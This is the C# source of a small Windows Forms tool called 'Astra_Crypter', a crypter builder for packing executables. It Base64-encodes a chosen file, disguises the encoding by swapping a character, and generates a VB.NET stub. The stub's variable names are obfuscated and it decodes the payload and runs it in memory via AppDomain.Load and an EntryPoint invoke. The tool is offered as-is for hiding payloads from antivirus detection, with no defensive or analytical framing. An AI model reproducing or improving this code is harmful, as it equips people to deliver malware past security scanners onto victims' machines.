using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.IO;

namespace Astra_Crypter
{
    public partial class Form1 : Form
    {
        string chara = "A";
        string filename = "";
        public Form1()
        {
            InitializeComponent();
        }

        private void textBox2_TextChanged(object sender, EventArgs e)
        {

        }
        
        private void textBox1_TextChanged(object sender, EventArgs e)
        {

        }

        private void button1_Click(object sender, EventArgs e)
        {
            if (filename == "")
            {
                var result = MessageBox.Show("WARNING" + Environment.NewLine + "You did not select any file.", "WARNING", MessageBoxButtons.RetryCancel);
                if (result == DialogResult.Retry)
                {
                    openFileDialog1.ShowDialog();
                }


            }

            byte[] buffer = File.ReadAllBytes(filename);
            var plaintext = Convert.ToBase64String(buffer);
            textBox1.Text = plaintext;

        }

        private void label2_Click(object sender, EventArgs e)
        {

        }

        private void button2_Click(object sender, EventArgs e)
        {
            chara = textBox3.Text;
            string newtext = textBox1.Text.Replace("A", chara);
            textBox1.Text = newtext;
        }

        private void textBox3_TextChanged(object sender, EventArgs e)
        {

        }

        private void button3_Click(object sender, EventArgs e)
        {
            
            string base64 = textBox1.Text;
            string thi =

                
                "Module module1" + Environment.NewLine +
                "Sub Main()" + Environment.NewLine +
                "Dim 饕餮饕餮 As String = \"" + base64 + "\"" + Environment.NewLine +
                "Dim 饕餮饕餮饕餮 As String = Replace(饕餮饕餮, \"" + chara + "\", \"A\")" + Environment.NewLine +
                "Dim 饕餮饕餮饕餮饕餮() As Byte = Convert.FromBase64String(饕餮饕餮饕餮)" + Environment.NewLine +

                "CallByName(AppDomain.CurrentDomain.Load(饕餮饕餮饕餮饕餮).EntryPoint, \"Invoke\", CallType.Method, \"\", Nothing)" + Environment.NewLine +
                "End Sub" + Environment.NewLine + 
                "End Module";
                
                
            textBox1.Text = thi;
            




        }

        private void button4_Click(object sender, EventArgs e)
        {

            openFileDialog1.ShowDialog();
            if (filename != "")
            {
                
                MessageBox.Show(filename + " Loaded", "Successfull", MessageBoxButtons.OK);
            }
            

        }

        private void openFileDialog1_FileOk(object sender, CancelEventArgs e)
        {
            filename = openFileDialog1.FileName;
        }

        private void label1_Click(object sender, EventArgs e)
        {
            
        }

        private void button5_Click(object sender, EventArgs e)
        {

        }
    }
}
